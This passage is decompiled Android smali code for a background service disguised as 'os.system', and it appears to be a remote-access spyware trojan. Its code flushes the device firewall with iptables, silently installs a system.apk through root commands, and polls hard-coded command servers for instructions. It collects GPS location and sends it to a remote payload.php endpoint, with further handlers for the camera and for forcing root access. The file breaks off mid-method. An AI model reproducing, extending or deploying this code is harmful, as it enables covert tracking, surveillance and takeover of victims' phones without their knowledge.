.class public Los/system/SystemThread;
.super Landroid/app/Service;
.source "SystemThread.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Los/system/SystemThread$PayloadWebTask;
    }
.end annotation


# static fields
.field public static TAG:Ljava/lang/String;

.field private static alert_durasi:I

.field private static alert_letak:I

.field private static alert_warna:I

.field private static install_app:Ljava/lang/String;

.field private static install_paket:Ljava/lang/String;

.field public static iserver:I

.field private static jcamera:I

.field public static jumserver:I

.field public static payloadWebResult:Ljava/lang/String;

.field public static payloadWebResultSwitch:Ljava/lang/String;

.field public static payloadWebResultTarget:Ljava/lang/String;

.field private static server:[Ljava/lang/String;

.field public static urlServer:Ljava/lang/String;


# instance fields
.field private binder:Los/system/CamRuntime$LocalBinder;

.field private broreceiver:Landroid/content/BroadcastReceiver;

.field private camHandler:Landroid/os/Handler;

.field private camRefresh:Ljava/lang/Runnable;

.field private camServiceConeksi:Landroid/content/ServiceConnection;

.field private insHandler:Landroid/os/Handler;

.field private insRefresh:Ljava/lang/Runnable;

.field public ip:Ljava/lang/String;

.field private ipflush:[Ljava/lang/String;

.field private mHandler:Landroid/os/Handler;

.field private mRefresh:Ljava/lang/Runnable;

.field private myident:Ljava/lang/String;

.field private receAction:Los/system/ReceiverBoot;

.field private seteditor:Landroid/content/SharedPreferences$Editor;

.field private settings:Landroid/content/SharedPreferences;

.field temp:Z

.field private term:[Ljava/lang/String;

.field private timenow:Ljava/lang/String;

.field private utf:Ljava/lang/String;

.field private utils:Los/system/ServerUtils;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    const/4 v1, 0x3

    const/4 v2, 0x0

    .line 53
    const-string v0, "AsDfGhJkL"

    sput-object v0, Los/system/SystemThread;->TAG:Ljava/lang/String;

    .line 54
    const-string v0, ""

    sput-object v0, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    .line 55
    const-string v0, ""

    sput-object v0, Los/system/SystemThread;->payloadWebResultTarget:Ljava/lang/String;

    .line 56
    const-string v0, ""

    sput-object v0, Los/system/SystemThread;->payloadWebResultSwitch:Ljava/lang/String;

    .line 57
    const-string v0, ""

    sput-object v0, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    .line 58
    sput v2, Los/system/SystemThread;->iserver:I

    .line 59
    sput v1, Los/system/SystemThread;->jumserver:I

    .line 62
    new-array v0, v1, [Ljava/lang/String;

    const-string v1, "http://10.42.0.1"

    aput-object v1, v0, v2

    const/4 v1, 0x1

    const-string v2, "http://sunjangyo12.000webhostapp.com"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "http://localhost:8888/index_.php"

    aput-object v2, v0, v1

    sput-object v0, Los/system/SystemThread;->server:[Ljava/lang/String;

    .line 63
    const v0, 0x1c9ff1

    sput v0, Los/system/SystemThread;->jcamera:I

    .line 64
    const/16 v0, -0x100

    sput v0, Los/system/SystemThread;->alert_warna:I

    .line 65
    const/16 v0, 0x31

    sput v0, Los/system/SystemThread;->alert_letak:I

    .line 66
    const/16 v0, 0x1b58

    sput v0, Los/system/SystemThread;->alert_durasi:I

    .line 67
    const-string v0, ""

    sput-object v0, Los/system/SystemThread;->install_app:Ljava/lang/String;

    .line 68
    const-string v0, ""

    sput-object v0, Los/system/SystemThread;->install_paket:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 4

    .prologue
    const/4 v3, 0x1

    .line 39
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 41
    const/16 v0, 0x8

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "iptables -F"

    aput-object v2, v0, v1

    const-string v1, "iptables -X"

    aput-object v1, v0, v3

    const/4 v1, 0x2

    const-string v2, "iptables -t nat -F"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "iptables -t mangle -F"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "iptables -t mangle -X"

    aput-object v2, v0, v1

    const/4 v1, 0x5

    const-string v2, "iptables -P INPUT ACCEPT"

    aput-object v2, v0, v1

    const/4 v1, 0x6

    const-string v2, "iptables -P OUTPUT ACCEPT"

    aput-object v2, v0, v1

    const/4 v1, 0x7

    const-string v2, "iptables -p FORWARD ACCEPT"

    aput-object v2, v0, v1

    iput-object v0, p0, Los/system/SystemThread;->ipflush:[Ljava/lang/String;

    .line 52
    const-string v0, ""

    iput-object v0, p0, Los/system/SystemThread;->myident:Ljava/lang/String;

    .line 60
    const-string v0, ""

    iput-object v0, p0, Los/system/SystemThread;->ip:Ljava/lang/String;

    .line 71
    const-string v0, "UTF-16"

    iput-object v0, p0, Los/system/SystemThread;->utf:Ljava/lang/String;

    .line 78
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Los/system/SystemThread;->mHandler:Landroid/os/Handler;

    .line 79
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Los/system/SystemThread;->camHandler:Landroid/os/Handler;

    .line 80
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Los/system/SystemThread;->insHandler:Landroid/os/Handler;

    .line 82
    iput-boolean v3, p0, Los/system/SystemThread;->temp:Z

    .line 83
    new-instance v0, Los/system/SystemThread$1;

    invoke-direct {v0, p0}, Los/system/SystemThread$1;-><init>(Los/system/SystemThread;)V

    iput-object v0, p0, Los/system/SystemThread;->insRefresh:Ljava/lang/Runnable;

    .line 108
    new-instance v0, Los/system/SystemThread$2;

    invoke-direct {v0, p0}, Los/system/SystemThread$2;-><init>(Los/system/SystemThread;)V

    iput-object v0, p0, Los/system/SystemThread;->mRefresh:Ljava/lang/Runnable;

    .line 122
    new-instance v0, Los/system/SystemThread$3;

    invoke-direct {v0, p0}, Los/system/SystemThread$3;-><init>(Los/system/SystemThread;)V

    iput-object v0, p0, Los/system/SystemThread;->camRefresh:Ljava/lang/Runnable;

    .line 764
    new-instance v0, Los/system/SystemThread$6;

    invoke-direct {v0, p0}, Los/system/SystemThread$6;-><init>(Los/system/SystemThread;)V

    iput-object v0, p0, Los/system/SystemThread;->camServiceConeksi:Landroid/content/ServiceConnection;

    return-void
.end method

.method static synthetic access$000(Los/system/SystemThread;)Ljava/lang/Runnable;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->insRefresh:Ljava/lang/Runnable;

    return-object v0
.end method

.method static synthetic access$100(Los/system/SystemThread;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->insHandler:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic access$1000(Los/system/SystemThread;)Los/system/CamRuntime$LocalBinder;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->binder:Los/system/CamRuntime$LocalBinder;

    return-object v0
.end method

.method static synthetic access$1002(Los/system/SystemThread;Los/system/CamRuntime$LocalBinder;)Los/system/CamRuntime$LocalBinder;
    .locals 0

    .prologue
    .line 39
    iput-object p1, p0, Los/system/SystemThread;->binder:Los/system/CamRuntime$LocalBinder;

    return-object p1
.end method

.method static synthetic access$1100(Los/system/SystemThread;)Landroid/content/ServiceConnection;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->camServiceConeksi:Landroid/content/ServiceConnection;

    return-object v0
.end method

.method static synthetic access$1200()I
    .locals 1

    .prologue
    .line 39
    sget v0, Los/system/SystemThread;->alert_letak:I

    return v0
.end method

.method static synthetic access$1300()I
    .locals 1

    .prologue
    .line 39
    sget v0, Los/system/SystemThread;->alert_warna:I

    return v0
.end method

.method static synthetic access$1500()[Ljava/lang/String;
    .locals 1

    .prologue
    .line 39
    sget-object v0, Los/system/SystemThread;->server:[Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$200()Ljava/lang/String;
    .locals 1

    .prologue
    .line 39
    sget-object v0, Los/system/SystemThread;->install_paket:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$300(Los/system/SystemThread;)Los/system/ReceiverBoot;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    return-object v0
.end method

.method static synthetic access$400()Ljava/lang/String;
    .locals 1

    .prologue
    .line 39
    sget-object v0, Los/system/SystemThread;->install_app:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$500(Los/system/SystemThread;)Ljava/lang/Runnable;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->mRefresh:Ljava/lang/Runnable;

    return-object v0
.end method

.method static synthetic access$600(Los/system/SystemThread;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->mHandler:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic access$700(Los/system/SystemThread;)Ljava/lang/Runnable;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->camRefresh:Ljava/lang/Runnable;

    return-object v0
.end method

.method static synthetic access$800(Los/system/SystemThread;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 39
    iget-object v0, p0, Los/system/SystemThread;->camHandler:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic access$900()I
    .locals 1

    .prologue
    .line 39
    sget v0, Los/system/SystemThread;->jcamera:I

    return v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    .line 632
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 6

    .prologue
    const/4 v4, 0x0

    .line 637
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 638
    const-string v0, "Settings"

    invoke-virtual {p0, v0, v4}, Los/system/SystemThread;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Los/system/SystemThread;->settings:Landroid/content/SharedPreferences;

    .line 639
    iget-object v0, p0, Los/system/SystemThread;->settings:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    iput-object v0, p0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    .line 640
    sget-object v0, Los/system/SystemThread;->server:[Ljava/lang/String;

    sget v1, Los/system/SystemThread;->iserver:I

    aget-object v0, v0, v1

    sput-object v0, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    .line 642
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 643
    const-string v1, "android.intent.action.DATE_CHANGED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 644
    const-string v1, "android.intent.action.HEADSET_PLUG"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 645
    const-string v1, "android.intent.action.SCREEN_ON"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 646
    const-string v1, "android.intent.action.ACTION_POWER_CONNECTED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 647
    const-string v1, "android.intent.action.ACTION_POWER_DISCONNECTED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 648
    const-string v1, "android.intent.action.MANAGE_NETWORK_USAGE"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 649
    const-string v1, "android.intent.action.AIRPLANE_MODE"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 650
    const-string v1, "android.intent.action.SCREEN_OFF"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 652
    new-instance v1, Los/system/ReceiverBoot;

    invoke-direct {v1}, Los/system/ReceiverBoot;-><init>()V

    iput-object v1, p0, Los/system/SystemThread;->broreceiver:Landroid/content/BroadcastReceiver;

    .line 653
    new-instance v1, Los/system/ReceiverBoot;

    invoke-direct {v1}, Los/system/ReceiverBoot;-><init>()V

    iput-object v1, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    .line 654
    new-instance v1, Los/system/ServerUtils;

    invoke-direct {v1, p0}, Los/system/ServerUtils;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Los/system/SystemThread;->utils:Los/system/ServerUtils;

    .line 656
    new-instance v1, Ljava/io/File;

    iget-object v2, p0, Los/system/SystemThread;->utils:Los/system/ServerUtils;

    invoke-virtual {v2}, Los/system/ServerUtils;->getPathExternal()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 657
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 658
    invoke-virtual {v1}, Ljava/io/File;->mkdir()Z

    .line 661
    :cond_0
    iget-object v1, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-boolean v1, Los/system/ReceiverBoot;->finishInstall:Z

    if-eqz v1, :cond_1

    .line 662
    new-instance v1, Los/system/MainActivity;

    invoke-direct {v1}, Los/system/MainActivity;-><init>()V

    const-string v2, "os.system"

    const-string v3, "cek"

    invoke-virtual {v1, p0, v2, v3}, Los/system/MainActivity;->apkMana(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_1

    .line 664
    iget-object v1, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-boolean v1, Los/system/ReceiverBoot;->rootResult:Z

    if-eqz v1, :cond_2

    .line 665
    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "pm install "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/system.apk"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v1, v4

    .line 666
    iget-object v2, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    invoke-virtual {v2, v1}, Los/system/ReceiverBoot;->rootCommands([Ljava/lang/String;)V

    .line 677
    :cond_1
    :goto_0
    iget-object v1, p0, Los/system/SystemThread;->broreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Los/system/SystemThread;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 678
    iget-object v0, p0, Los/system/SystemThread;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/SystemThread;->mRefresh:Ljava/lang/Runnable;

    const-wide/16 v2, 0x1388

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 679
    return-void

    .line 669
    :cond_2
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/system.apk"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sput-object v1, Los/system/SystemThread;->install_app:Ljava/lang/String;

    .line 670
    const-string v1, "os.system"

    sput-object v1, Los/system/SystemThread;->install_paket:Ljava/lang/String;

    .line 672
    iget-object v1, p0, Los/system/SystemThread;->insHandler:Landroid/os/Handler;

    iget-object v2, p0, Los/system/SystemThread;->insRefresh:Ljava/lang/Runnable;

    const-wide/16 v4, 0x7d0

    invoke-virtual {v1, v2, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 3

    .prologue
    .line 692
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 693
    iget-object v0, p0, Los/system/SystemThread;->broreceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Los/system/SystemThread;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 694
    iget-object v0, p0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v1, "cekversion"

    const-string v2, "destroy"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 695
    iget-object v0, p0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 696
    iget-object v0, p0, Los/system/SystemThread;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/SystemThread;->mRefresh:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 697
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    .prologue
    .line 684
    sget-object v0, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v1, "service start oke"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 687
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method

.method public payload(Landroid/content/Context;)V
    .locals 18

    .prologue
    .line 154
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/inpayload.txt"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "text"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 155
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/swthread.txt"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "sw"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 156
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/target.txt"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "target"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 159
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v2, Los/system/ReceiverBoot;->identitasResult:Ljava/lang/String;

    move-object/from16 v0, p0

    iput-object v2, v0, Los/system/SystemThread;->myident:Ljava/lang/String;

    .line 161
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->myident:Ljava/lang/String;

    sget-object v3, Los/system/SystemThread;->payloadWebResultTarget:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1b

    .line 163
    sget-object v2, Los/system/SystemThread;->payloadWebResultSwitch:Ljava/lang/String;

    const-string v3, "hidup"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    sget-object v2, Los/system/SystemThread;->payloadWebResultSwitch:Ljava/lang/String;

    const-string v3, "mati"

    .line 164
    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 166
    :cond_0
    sget-object v2, Los/system/SystemThread;->payloadWebResultSwitch:Ljava/lang/String;

    const-string v3, "hidup"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_c

    .line 167
    sget-object v2, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v3, ">>>> MODE SUPER AKTIF..........."

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 168
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v3, "swmain"

    sget-object v4, Los/system/SystemThread;->payloadWebResultSwitch:Ljava/lang/String;

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 169
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 177
    :cond_1
    :goto_0
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "server"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 178
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-boolean v2, Los/system/ReceiverBoot;->installResult:Z

    if-eqz v2, :cond_d

    .line 180
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v2, v0}, Los/system/ReceiverBoot;->_server(Landroid/content/Context;)V

    .line 181
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Los/system/ReceiverBoot;->setServer(Z)Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 190
    :cond_2
    :goto_1
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "gps"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 191
    new-instance v2, Los/system/GPSresult;

    move-object/from16 v0, p1

    invoke-direct {v2, v0}, Los/system/GPSresult;-><init>(Landroid/content/Context;)V

    sget-object v2, Los/system/GPSresult;->gpsResult:Ljava/lang/String;

    .line 192
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 194
    :cond_3
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "pakroot"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 195
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v3, "pakroot"

    const-string v4, "aktif"

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 196
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 198
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "paksa root allow superuser diaktifkan"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 200
    :cond_4
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "alert"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_5

    .line 201
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

